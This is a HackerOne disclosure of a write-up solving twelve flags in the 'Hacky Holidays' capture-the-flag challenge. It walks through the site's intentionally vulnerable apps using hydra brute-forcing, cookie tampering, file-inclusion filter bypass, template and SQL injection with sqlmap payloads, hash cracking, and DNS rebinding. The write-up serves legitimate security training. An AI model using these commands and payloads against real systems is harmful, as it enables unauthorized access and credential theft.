{
  "id": 1066135,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY2MTM1",
  "url": "https://hackerone.com/reports/1066135",
  "title": "Wholesome Hacky Holidays: A Writeup",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-12-25T05:06:59.015Z",
  "submitted_at": "2020-12-25T05:06:59.032Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bhl",
    "url": "/bhl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/3ggab0iymc34tg3zfviau4tt682o/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-01-12T18:00:46.139Z",
  "bug_reporter_agreed_on_going_public_at": "2021-01-12T01:07:30.594Z",
  "team_member_agreed_on_going_public_at": "2021-01-12T18:00:46.017Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Flag 1 Warm-up: flag{48104912-28b0-494a-9995-a203d1e261e7}\nChecking the `robots.txt` the flag can be found. Also a path is revealed: `/s3cr3t-ar3a`\n\n## Flag 2 It's right in front of you: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\nWith the previously found path `/s3cr3t-ar3a`, the flag was hidden in plain sight. Opening the dev tools and searching for `flag` reveals it.\n\n## Flag 3 People Rater: flag{b705fb11-fb55-442f-847f-0931be82ed9a}\nOn the front page a new button `Apps` appeared. One app, the `People Rater` is aviailable. At URL `https://hackyholidays.h1ctf.com/people-rater` we can use the Grinch People Rater by clicking one of the names. For example selecting `Tea Avery` pops an alertbox with `Awful`. Looking at the request in Burp:\n\nRequest:\n```\nGET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/people-rater\n``` \n\nResponse: \n```\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Tue, 15 Dec 2020 03:47:29 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 57\n\n{\"id\":\"eyJpZCI6Mn0=\",\"name\":\"Tea Avery\",\"rating\":\"Awful\"}\n```\n\nIn the request, we see the parameter `id=eyJpZCI6Mn0=` which is an encoded base64 string. Decoding it reveals `{\"id\":2}`. Simply replacing the value with the base64 encoded variant of `{\"id\":2}`, which is `eyJpZCI6MX0=` leads to the following response:\n```\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Tue, 15 Dec 2020 03:51:22 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 135\n\n{\"id\":\"eyJpZCI6MX0=\",\"name\":\"The Grinch\",\"rating\":\"Amazing in every possible way!\",\"flag\":\"flag{b705fb11-fb55-442f-847f-0931be82ed9a}\"}\n```\n## Flag 4 Swag Shop: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\nThe objective of this challenge is to pull the Grinch's details from the online shop. We are presented with an online shop that has an API. We can fuzz the API and find the following two hidden endpoints:\n```\n/swag-shop/api/sessions\n/swag-shop/api/user\n```\nThe first endpoint reveals 7 different base64-encoded session tokens. One of the tokens is longer than the others. Decoding it reveals:\n```\n{\"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"cookie\":\"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=\"}\n```\nHere, we have a Universal Unique Identifier (UUID) and a cookie. \nTaken a look at the `/swag-shop/api/user` endpoint results in:\n```\nerror\t\"Missing required fields\"\n```\nSo here, we are searching for a parameter. By manual testing with the information that we already collected we can identify uuid as a parameter. Requesting `/swag-shop/api/user?uuid=1` responds with: \n```\nerror\t\"Could not find matching uuid\"\n```\nSimply appending the UUID to the URI we found previously and accessing \n`https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043` we can pull the Grinch's details and a flag.\n```\t\nuuid\t\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\"\nusername\t\"grinch\"\naddress\t\nline_1\t\"The Grinch\"\nline_2\t\"The Cave\"\nline_3\t\"Mount Crumpit\"\nline_4\t\"Whoville\"\nflag\t\"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\"\n```\n\n## Flag 5 Secure Login: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\nThe objective of this challenge is to find a way past the login page to get to the secret area. The challenge starts with a login page. Testing a random combination for the username and password field, an `Invalid Username` appears. This is an indicator, that we might be able to brute-force the username and password individually based on the error code. We first try to brute-force the username with: \n```\nhydra -L ~/SecLists/Usernames/Names/names.txt -p pass hackyholidays.h1ctf.com https-post-form \"/secure-login:username=^USER^&password=^PASS^:Invalid Username\"\n```\nWe receive the username:`access`. Given the username, trying a random password leads to the error response `Invalid Password`. We can brute-force the password using: \n```\nhydra -l access -P ~/wordlists/rockyou.txt hackyholidays.h1ctf.com https-post-form \"/secure-login:username=^USER^&password=^PASS^:Invalid Password\"\n```\nWe receive the password: `computer`. Logging in with the brute-forced credentials we land at a page with secure files where are `No Files To Download`. Investigating the response in Burp, we can notice the Cookie:\n```\neyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D\n```\nDoing a base64-decoding on the cookie shows:\n```\n{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}7\n```\nWe change the cookie to:\n```\n{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":true}\n```\nand encode it with base64 again:\n```\neyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==\n```\nWith this we can see one file named `my_secure_files_not_for_you.zip`, which we can download locally (`wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip`). Trying to unzip the file, a password is requested. We can crack this with john the ripper.\n```\nzip2john my_secure_files_not_for_you.zip > my_secure_files_not_for_you.txt\njohn my_secure_files_not_for_you.txt\n```\nJohn the ripper cracks the password, which is `hahahaha`. With the password, we can unzip the archive and retrieve the flag.\n\n## Flag 6 My Diary: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}\nThe objective of this challenge is to hack the Grinch's diary to find out about his upcoming event. Starting the challenge, we can directly recognize the path `my-diary/?template=entries.html`. It seems that the `entries.html` is included through the `template` parameter. It might also be possible to include other pages then. Through a bit of manual testing for some common pages, we can find `/template=index.php`, which presents the respective php code. \n```php\n<?php\nif( isset($_GET[\"template\"])  ){\n    $page = $_GET[\"template\"];\n    //remove non allowed characters\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n    //I've changed the admin file to secretadmin.php for more security!\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    //check file exists\n    if( file_exists($page) ){\n       echo file_get_contents($page);\n    }else{\n        //redirect to home\n        header(\"Location: /my-diary/?template=entries.html\");\n        exit();\n    }\n}else{\n    //redirect to home\n    header(\"Location: /my-diary/?template=entries.html\");\n    exit();\n}\n```\nVisiting the endpoint `secretadmin.php` we see the message `You cannot view this page from your IP Address`. After trying a few bypasses, it becomes clear that this seems to be a dead end. Taking a closer look at our previously found `index.php` we can see that the code does three things. \n 1. Special characters are eliminated\n 2. The string `admin.php` is eliminated\n 3. The string `secretadmin.php` is eliminated. \nTo include `secretadmin.php` we need to bypass these restrictions. This can be achieved through the following parameter `ssecretaadmin.phpdmin.phpecretaadmin.phpdmin.php`. This will include the `secretadmin.php` file and we can retrieve the flag and see that the Grinch plans to `Launch DDoS Against Santa's Workshop!` on `23rd Dec`.\n\n## Flag 7 Hate Mail Generator: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\nIn this challenge, we are asked to find the flag in the Grinch's hate mail generator. Clicking through the app, we find that the grinch uses templates:\n```\n{{template:cbdj3_grinch_header.html}} \nHi {{name}}..... \nGuess what..... \n<strong>YOU SUCK!</strong>\n{{template:cbdj3_grinch_footer.html}}\n```\nFrom here we can see that we can include `{{name}}` as well as two templates. It is also possible to create a new mail for testing. If we try to include a wrong path with `{{template:chron0x}}` we get the response `Cannot find template file /templates/chron0x`. Checking the path `/hate-mail-generator/templates/` we find that there exists another template: `38dhs_admins_only_header.html`. However, including it in the markup results in the message: `You do not have access to the file 38dhs_admins_only_header.html`. On the other side including it in the Subject or Name field does not lead to such an error. Previously we also have seen, that it is possible to include `{{name}}`. Investigating the request in Burp, we can see that `preview_data` is used as a body parameter. URL decoding the parameter results in:\n```\n{\"name\":\"Alice\",\"email\":\"alice@test.com\"}\n```\nHere we can manipulate the name parameter to `{\"name\":\"{{template:38dhs_admins_only_header.html}}\",\"email\":\"alice@test.com\"}` and URL-encode it again. Providing the manipulated `preview_data` body parameter with `{{name}}` in the markup field we can access the `Grinch Network Admins Only` area and find the flag. The manipulated body looks like this:\n```\npreview_markup=%7B%7Bname%7D%7D&preview_data=%7B%22name%22%3A%22%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D%22%2C%22email%22%3A%22alice%40test.com%22%7D\n```\n\n## Flag 8 Forum: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\nThe objective of this challenge is to access the admin space of the Grinch's forum. In the forum, we can identify the username `grinch` and `max`. Brute-forcing for passwords with these usernames does not give any result. A directory brute-force reveals the path `/forum/phpmyadmin`. Here, brute-forcing does also not lead to any further results. After further searches for Grinch-Networks on Google and Github, the source code of the forum could be discovered at `https://github.com/Grinch-Networks/forum`. Looking at the commits, the credentials for the phpmyadmin can be discovered in the [\"Small fix\" commit](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae). The credentials are `forum:6HgeAZ0qC9T6CQIqJpD`. Clicking through the pages we can discover MD5-hashed passwords for the grinch and max at `/forum/phpmyadmin?db=forum&table=user`. [Crackstation](https://crackstation.net/) can crack the password of the grinch. \n```\ngrinch  35D652126CA1706B59DB02C93E0C9FBF    md5     BahHumbug\nmax     388E015BC43980947FCE0E5DB16481D1    Unknown Not found.\n```\nLogging in with `grinch:BahHumbug` at `/forum/login` we can access the `Secret Plans` blogpost which further details the Grinch's DDoS attack plans as well as the flag.\n\n## FLag 9 Evil Quiz: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}\nIn this challenge, we are participating in a quiz by the grinch. After poking around at the page we notice that the `name` field/parameter is vulnerable to SQL injection. Injecting `' or (select sleep(15)); --` as the name and navigating to `/evil-quiz/score` puts the site to sleep for 15 seconds. From this, we know that we might deal here with a second-order time-based blind SQL injection. So lets fire up `sqlmap`:\n```\nsqlmap -u https://hackyholidays.h1ctf.com/evil-quiz --data \"name=chron0x\" -p \"name\" --method POST --second-url \"https://hackyholidays.h1ctf.com/evil-quiz/score\" --cookie=\"session=4e78bb0ffd17d4f1f67799a8d4165394\" -D quiz --dump\n```\nSqlmap finally reveals the credentials: `admin:S3creT_p4ssw0rd-$`. With these, we can log in to the admin panel (`/evil-quiz/admin`) and retrieve the flag.\n\n## Flag 10 Signup Manager: flag{99309f0f-1752-44a5-af1e-a03e4150757d}\nAt the beginning of the challenge, we are presented with a login forum. After an attempt to create an account we are stuck with the message `We'll have a look into you and see if you're evil enough to join the grinch army!` with only the option to log out. Inspecting the source of the login page, we can see a reference to `README.md` in a comment at the top. Navigating to `/signup-manager/README.md` automatically downloads the markdown file. The content is as follows:\n```\n# SignUp Manager\n\nSignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.\n\n### How to Install\n\n1) Create a directory that you wish SignUp Manager to be installed into\n\n2) Move signupmanager.zip into the new directory and unzip it.\n\n3) For security move users.txt into a directory that cannot be read from website visitors\n\n4) Update index.php with the location of your users.txt file\n\n5) Edit the user and admin php files to display your hidden content\n\n6) You can make anyone an admin by changing the last character in the users.txt file to a Y\n\n7) Default login is admin / password\n```\nWe can notice the reference to `signupmanager.zip`. Navigating to `/signup-manager/signupmanager.zip` downloads a zip file containing the source code of the application. Of the source code, only the `index.php` file is relevant for this challenge. In a nutshell, the code takes the username, password, age, first name, and last name as inputs, substitutes special characters, checks that their length is below a certain length, and pads them if necessary. The inputs are concatenated with a random md5 hash in between. Most importantly, the code appends the character `N` at the end of the string, to flag this user as non-root. The `README.md`, as well as the source code, reveal that access to the admin page is granted when the character `Y` is appended instead. Hence, the objective is to inject a `Y` at the end of our string through the last name parameter. Therefore the string has to be extended.\nOf special interest for this challenge is the handling of the age-parameter:\n```php\n[...]\nif (!is_numeric($_POST[\"age\"])) {\n    $errors[] = 'Age entered is invalid';\n}\nif (strlen($_POST[\"age\"]) > 3) {\n    $errors[] = 'Age entered is too long';\n}\n[...]\n```\nIn short, the age parameter has to be numeric and less than 3 characters. At first thought, this might only allow a maximum age of 999. However, php also allows the scientific notation with the `e` character. For example `1e4` will be translated to `10000`. As we can see `1ex` fulfills our conditions: It is numeric, fewer characters than 3, and will extend our string.\nWith this knowledge we can register a new user and change the payload as follows:\n```\naction=signup&username=pink&password=panther&age=1e3&firstname=pink&lastname=pantherYYYYYYYY\n```\nThis will forward us to the admin area and present the flag.\n\n## Flag 11 SQL Inception: flag{07a03135-9778-4dee-a83c-7ec330728e72}\nApart from the flag, challenge 10 also presented a link: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59`, which is the starting point of this challenge. Be prepared for some brain toasting from here on. Browsing through the app we find that there are three albums which are requested via a hash, such as `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`. Each album requests several images, for example like `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9`. Decoding the data value with base64 reveals: \n```\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/9b881af8b32ff07f6daada95ff70dc3a.jpg\",\"auth\":\"e934f4407a9df9fd272cdb9c397f673f\"}\n```\nFurther, there is an endpoint `/r3c0n_server_4fdk59/api` which states \n```\n+------------------+----------------------------------------------+\n| HTTP Status Code |                 Explanation                  |\n+------------------+----------------------------------------------+\n| 200              | Successful request with data returned        |\n| 204              | Successful request but with no data found    |\n| 404              | Invalid Endpoint                             |\n| 400              | Invalid GET/POST variable                    |\n| 401              | Unauthenticated Request or Invalid client IP |\n+------------------+----------------------------------------------+\n```\nAfter a bit of tinkering with the app, we find that the `hash` parameter in album is vulnerable against SQL injection. \n```\n$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbs --dump\n\n---\nParameter: hash (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: hash=jdh34k' AND 6610=6610 AND 'Fhnh'='Fhnh\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: hash=-2048' UNION ALL SELECT NULL,NULL,CONCAT(0x7178707a71,0x75596543734d797a5042444f5869494d5858675873624c52677a554a654f507072446f5078754469,0x7162627171)-- -\n---\n[11:09:20] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL 8\n[11:09:20] [INFO] fetching database names\navailable databases [2]:\n[*] information_schema\n[*] recon\n\nDatabase: recon\nTable: album\n[3 entries]\n+----+--------+-----------+\n| id | hash   | name      |\n+----+--------+-----------+\n| 1  | 3dir42 | Xmas 2018 |\n| 2  | 59grop | Xmas 2019 |\n| 3  | jdh34k | Xmas 2020 |\n+----+--------+-----------+\n\nDatabase: recon\nTable: photo\n[6 entries]\n+----+----------+--------------------------------------+\n| id | album_id | photo                                |\n+----+----------+--------------------------------------+\n| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |\n| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |\n| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |\n| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |\n| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |\n| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |\n+----+----------+--------------------------------------+\n```\nThe requests to this database might look something like this: \n```SQL\nselect photo from album, photo where album.id = photo.album_id and hash = <input>\n```\nFrom the sqlmap output, we already know a payload: `chron0x' UNION ALL SELECT NULL,NULL,\"chron0x\"-- -`. This will print `chron0x` on a page. At that time a lot of people including me were stuck and in the forum, several hints regarding the movie \"Inception\" were dropped. It turned out that these referred to an SQL injection in the SQL injection. Following these hints and with a bit of tinkering, we can find another SQL injection in the SQL Injection.\n```\nchron0x' UNION ALL SELECT \"chron0x' UNION ALL SELECT NULL,NULL,'chron0x_path'-- -\",null,null -- -\n```\nUsing this payload, the response to `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=hash=chron0x%27%20UNION%20ALL%20SELECT%20%22chron0x%27%20UNION%20ALL%20SELECT%20NULL,NULL,%27chron0x_path%27--%20-%22,null,null%20--%20-`, will try to fetch an image with the following: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2Nocm9uMHhfcGF0aCIsImF1dGgiOiJmOTNjMzI5MjI5OTU0ZWQzOWRmYTRhMzkwMTNmNjljNSJ9`. Decoding the base64 payload, we can see that `chron0x_path` is reflected \n```\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/chron0x_path\",\"auth\":\"f93c329229954ed39dfa4a39013f69c5\"}\n```\nThe response of the request to fetch this image is `Expected HTTP status 200, Received: 404`. Now that we found the inception SQLi, lets write a small script to explore what we just did manually a bit more.\n```\n#!/bin/bash\n\nURL=\"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/\"\n\nBASE64=$(curl -s $URL\"album?hash=chron0x' UNION ALL SELECT \\\"chron0x' UNION ALL SELECT NULL,NULL,'$1'-- -\\\",null,null -- -\" \\\n        | grep \"img-responsive\" \\\n        | grep -o \"data\\=.*\" \\\n        | sed \"s/^data\\=//g\" \\\n        | sed \"s/\\\">//g\")\n\nRESP=$(curl -s $URL\"picture?data=\"$BASE64)\n\necho $1 $RESP\n```\nThe script will always respond with our input parameter and the response with respect to the picture query. Through either brute-forcing or some educated guesses we can find the following interesting responses.\n```\nchron0x Expected HTTP status 200, Received: 404\n../api Invalid content type detected\n../api/user Invalid content type detected\n```\nNote you can use the above script for brute-forcing by just queying it with each line of the wordlist and grepping for the reponses. Now we know that the user endpoint exists. The next step would be to query some user information. Through an educated guess or brute-forcing we can again find a valid parameter.\n```\n../api/user?name=chron0x Expected HTTP status 200, Received: 400\n../api/user?username=chron0x Expected HTTP status 200, Received: 204\n```\nAs we have seen from the previous table, response `204` means `Successful request but with no data found`. This means we found the `username` parameter. The next step would be to find a valid username. First, let's see if any character can give us a different response. Iterating through all ASCII characters we find:\n```\n../api/user?username=a Expected HTTP status 200, Received: 204\n../api/user?username=b Expected HTTP status 200, Received: 204\n../api/user?username=% Invalid content type detected\n```\nIn hope that the `%` character behaves as a wildcard, we can try if we can brute-force the first character of a username. Indeed, we can the following username:\n```\n../api/user?username=g% Invalid content type detected\n../api/user?username=gr% Invalid content type detected\n../api/user?username=gri% Invalid content type detected\n../api/user?username=grin% Invalid content type detected\n../api/user?username=grinc% Invalid content type detected\n../api/user?username=grinch% Invalid content type detected\n../api/user?username=grincha% Invalid content type detected\n../api/user?username=grinchad% Invalid content type detected\n../api/user?username=grinchadm% Invalid content type detected\n../api/user?username=grinchadmi% Invalid content type detected\n../api/user?username=grinchadmin% Invalid content type detected\n../api/user?username=grinchadmin Invalid content type detected\n```\n`grinchadmin` it is. Well, we already found a method to brute-force the username. Let's try if we can apply the same approach for a password. However, at this step, we have to be cautious, since we do not know how to connect the two parameters.\n```\n../api/user?username=grinchadmin&test=chron0x Invalid data format\n../api/user?username=grinchadmin%26test=chron0x Expected HTTP status 200, Received: 400\n```\nAs we can see, we should use the URL-encoded variant. Again through either an educated guess or through brute-force, we can find the password parameter.\n```\n../api/user?username=grinchadmin%26pass=chron0x Expected HTTP status 200, Received: 400\n../api/user?username=grinchadmin%26password=chron0x Expected HTTP status 200, Received: 204\n```\nWith the same procedure as before, we can brute-force the password.\n```\n../api/user?username=grinchadmin%26password=% Invalid content type detected\n../api/user?username=grinchadmin%26password=s% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4n% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4nt% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4nt4% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4nt4s% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4nt4su% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4nt4suc% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4nt4suck% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4nt4sucks% Invalid content type detected\n../api/user?username=grinchadmin%26password=s4nt4sucks Invalid content type detected\n```\nWe successfully brute-forced the credentials: `grinchadmin:s4nt4sucks`. To get the flag and to the next challenge, we can use the credentials to log in into the attack-box (`/attack-box`).\n\n# Flag 12 Attack Box: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}\nAt this stage, we are logged into the Grinch's attack server. From here we can start a DDOS attack at three of Santas' servers. The objective of this challenge is to reroute this DDOS attack toward the Grinch's server, in other words to localhost. Launching an attack against any of the servers, the following request is send: `/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`. Decoding the base64 reveals: `{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}`. For all three servers, this results in:\n```\n{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n{\"target\":\"203.0.113.53\",\"hash\":\"2814f9c7311a82f1b822585039f62607\"}\n{\"target\":\"203.0.113.213\",\"hash\":\"5aa9b5a497e3918c0e1900b2a2228c38\"}\n```\nThe `hash` parameter appears to be an MD5-hash. Tinkering with either the `target` or `hash` parameter results in the response: `Invalid Protection Hash`. This tells us that some sort of validation of the target and hash parameter is performed. Since the target does not directly translate to the hash, we can guess that it is a salted hash. We can try to crack the hash with hashcat. Therefore, we store our information in the form `$pass:$salt` into a file called `hash.txt`:\n```\n5f2940d65ca4140cc18d0878bc398955:203.0.113.33\n2814f9c7311a82f1b822585039f62607:203.0.113.53\n5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213\n```\nNow we can proceed to try to crack the hashes with \n```\nhashcat -m10 -O -o hash.out hash.txt /usr/share/wordlists/rockyou.txt\n```\nHere `-m10` stands for our selected format, as to how we stored the hashes in our file. After executing this we can view the outputs in the file `hash.out`:\n```\n5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463\n2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463\n5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463\n```\nWe successfully cracked the hashes and are now able to generate our payloads. As a quick sanity check we can confirm that the MD5 of `mrgrinch463203.0.113.33` is indeed `5f2940d65ca4140cc18d0878bc398955`. So lets redirect the attack against `127.0.0.1` with the following payload `{\"target\":\"127.0.0.1\",\"hash\":\"3e3f8df1658372edf0214e202acb460b\"}`, with `3e3f8df1658372edf0214e202acb460b` being the MD5 for `mrgrinch463127.0.0.1`. Launching the attack with `/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==` and visiting `https://hackyholidays.h1ctf.com/attack-box/launch/5867c35a78d569fea1d4ac81ae55e2e1`, we can see that:`Local target detected, aborting attack`. This means there is a detection in place, such that we do not attack ourselves. It would be great if we first could pretend that we are the target IP and then switch to the localhost. We can achieve exactly this with a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding). I used the following [service](https://lock.cmpxchg8b.com/rebinder.html). What it does is: \"The hostname generated will resolve randomly to one of the addresses specified with a very low time to live record.\" We insert our two IP addresses of choice `203.0.113.33` and `127.0.0.1` we receive the following address: `cb007121.7f000001.rbndr.us`. With `dig A cb007121.7f000001.rbndr.us` we can confirm that the address indeed resolves to any of the two domains randomly:\n```\ncb007121.7f000001.rbndr.us. 1\tIN\tA\t203.0.113.33\ncb007121.7f000001.rbndr.us. 1\tIN\tA\t127.0.0.1\n```\nAgain we can construct a new payload and base64 encode it: \n```\n{\"target\":\"cb007121.7f000001.rbndr.us\",\"hash\":\"aa9c061c933f709acb4d69329bc7b1af\"}\neyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9\n```\nWith the following path we can launch our attack: `/attack-box/launch?payload=eyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9`. The attack might not be successful on the first try, but after a few attempts the DNS rebinding attack is successful and we are knocking off the Grinch's server, and getting reconnected to `https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709` were we are presented with the final flag.\n\n## Impact\n\nPositive impact on my life.",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-02-11T01:07:31.917Z",
  "allow_singular_disclosure_after": -94827267.30081804,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "bhl"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 59882,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.hackyholidays.h1ctf.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
